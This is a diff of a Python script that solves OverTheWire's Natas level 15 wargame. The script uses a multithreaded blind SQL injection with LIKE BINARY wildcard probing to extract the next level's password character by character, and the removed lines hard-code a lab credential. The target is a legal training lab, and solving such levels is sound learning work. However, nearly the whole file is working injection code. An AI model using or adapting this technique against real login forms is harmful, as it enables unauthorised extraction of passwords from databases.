@@ -3,58 +3,44 @@ import concurrent.futures
 import string
 
 def req(x):
-    res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x, 'debug':'true'})
-    if "This user exists." in res.text:
-        return x
-    else:
-        return -1
-
+    res = requests.get(url=url,auth=lvl_pass, params={'username':'natas16" AND password LIKE BINARY "'+x, 'debug':'true'})
+    return x if "This user exists." in res.text else 0
 
 def findLen(num):
-    return num if req('_'*num) != -1 else -1
+    return num if req('_'*num) else 0
 
 def filterChars(char):
-    return char if req(f'%{char}%') != -1 else str(-1)
+    return char if req(f'%{char}%') else 0
 
-def findpw(g):
-    global pw
-    if req(pw+g+'%') != -1:
-        pw +=g
-        print(pw)
-        return g
-    else:
-        return '-1'
-
+def findpw(x):
+    num, g = x
+    return g if req('_'*num+g+'%') else ''
+        
 def main():
-    threads = 30
+    password = ''
+    threads = 100
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        num = executor.map(findLen, list(range(1,43)))
-    for x in num:
-        if x > 0:
-            pw_len = x
-#            print(pw_len)
+        pw_len = max(executor.map(findLen, list(range(1,43))))
+    
+    alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
     with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
-        ch = executor.map(filterChars, alphanum)
-    for x in ch:
-        if x != '-1':
-            filt_chars.append(x)
- #   print(''.join(filt_chars))
+        filt_chars = [ch for ch in executor.map(filterChars, alphanum) if ch]
+    
     for x in range(pw_len):
         with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
-            ch = executor.map(findpw, filt_chars)
+            ch = ''.join(executor.map(findpw, zip([x]*len(filt_chars),filt_chars)))
+        password += ch
+    return password
+
+lvl = '15'
+next_level = str(int(lvl)+1)
+pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
+url = f'http://natas{lvl}.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
 
 
+open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(main())
 
-url = 'http://natas15.natas.labs.overthewire.org'
-url2 = 'http://maxjytyla.com/index.php'
-lvl_pass = requests.auth.HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
-un_base = 'natas16" AND password LIKE BINARY "'
-alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
-filt_chars = []
-pw = ""
-
-
-main()
 
 '''
 Who the hell needs to be GIVEN the password?
